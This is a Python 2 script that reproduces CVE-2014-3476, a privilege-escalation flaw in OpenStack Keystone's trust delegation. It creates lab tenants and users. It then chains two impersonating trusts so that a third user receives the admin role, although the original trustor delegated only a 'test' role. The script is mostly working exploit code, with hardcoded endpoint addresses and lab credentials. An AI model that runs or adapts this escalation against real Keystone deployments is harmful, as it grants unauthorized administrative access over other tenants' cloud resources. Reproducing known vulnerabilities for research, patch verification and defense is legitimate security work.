# Reproduce the problem discribled in CVE-2014-3476

__author__ = 'hebin'

from keystoneclient.v3 import client

"""
To setup the experiment environment, do as follows:
1.Create three tenants:
	keystone tenant-create --name Tenant1
	keystone tenant-create --name Tenant2
	

	keystone tenant-create --name Tenant3
2.Create three users for each tenant:
	keystone user-create --name User1 --tenant Tenant1 --pass User1
	keystone user-create --name User2 --tenant Tenant2 --pass User2
	keystone user-create --name User3 --tenant Tenant3 --pass User3
3.Create a test role:
	keystone role-create --name test
4.Add the admin and test role of Tenant1 to User1:
	keystone user-role-add --user User1 --tenant Tenant1 --role admin
	keystone user-role-add --user User1 --tenant Tenant1 --role test
Now, we have three tenants and each tenant has a user. By default, every user has the '_member_'
role to the tenant, but,User1 has two more roles of Tenant1, are admin and test roles.
"""

os_auth_url = 'http://166.111.67.30:5000/v3'
os_endpoint = 'http://166.111.67.30:5000/v3'

# Define the information of the trustor
trustor = 'User1'
trustor_id = 'd1d165b232114259a621ae43b07d2b47'
trustor_project = 'Tenant1'
trustor_project_id = '9d422d6d07194cd9a3ed1384e682350e'

# Define the information of the middle trustee
middle_trustee = 'User2'
middle_trustee_id = '66acc392d68140eeb445f8640a306f39'
middle_trustee_project = 'Tenant2'

# Define the information of third trustee
third_trustee = 'User3'
third_trustee_id = '1853e3679ba34f90ae5ddb96c08ebb45'
third_trustee_project = 'Tenant3'

# Define the roles User1 delegates to User2
delegate_roles = ['test',]

# Define the roles User2 delegates to User3
bad_roles = ['admin','test',]
duration = 60

# Create a client with the trustor username and password
trustor_client = client.Client(debug=True,
                                username=trustor,
				password=trustor,
			        tenant_name=trustor_project,
                                auth_url=os_auth_url,
				stable_duration=duration,
				endpoint=os_endpoint)
ret = trustor_client.authenticate()
print "All roles of the trustor: %s" %trustor_client.auth_ref.role_names

# Create a trust use the trustor client with impersonation enabled for the middle trustee
trustor_trust = trustor_client.trusts.create(trustor_user=trustor_id,
                                                trustee_user=middle_trustee_id,
						project=trustor_project_id,
						role_names=delegate_roles,
						impersonation=True)
# If neccessary, show the trustor_trust
print 20*'---'
print "Roles the trustor has delegated to the trustee: %s" %trustor_trust.roles
print 20*'---'

# Create a middle trustee client scoped to the trustor trust 
# with the middle trustee username and password
middle_trustee_client = client.Client(debug=True,
                                        username=middle_trustee,
					password=middle_trustee,
					auth_url=os_auth_url,
					endpoint=os_endpoint,
                                        trust_id=trustor_trust.id,
					stable_duration=duration,
					force_new_token=True)
ret = middle_trustee_client.authenticate()
print "Whether the trustor trust scoped: %s" %middle_trustee_client.auth_ref.trust_scoped
print "The roles of middle trustee: %s" %middle_trustee_client.auth_ref.role_names
print 20*'---'

# Create a trust use the middle trustee client with impersonation enabled to impersonating the trustor
# for the third trustee
middle_trustee_trust = middle_trustee_client.trusts.create(trustor_user=trustor_id,
							    trustee_user=third_trustee_id,
                                                            project=trustor_project_id,
                                                            role_names=bad_roles,
                                                            impersonation=True)
print "Roles the middle_trustee has delegated to the third_trustee: %s" %middle_trustee_trust.roles
print 20*'---'	

# Create a third trustee client scoped to the middle trustee trust
third_trustee_client = client.Client(debug=True,
                                        username=third_trustee,
					password=third_trustee,
                                        auth_url=os_auth_url,
					endpoint=os_endpoint,
					trust_id=middle_trustee_trust.id,
					stable_duration=duration,
					force_new_token=True)
ret = third_trustee_client.authenticate()

print "Whether the middle trustee trust scoped: %s" %third_trustee_client.auth_ref.trust_scoped
print "The roles of third trustee: %s" %third_trustee_client.auth_ref.role_names
print 20*'---'
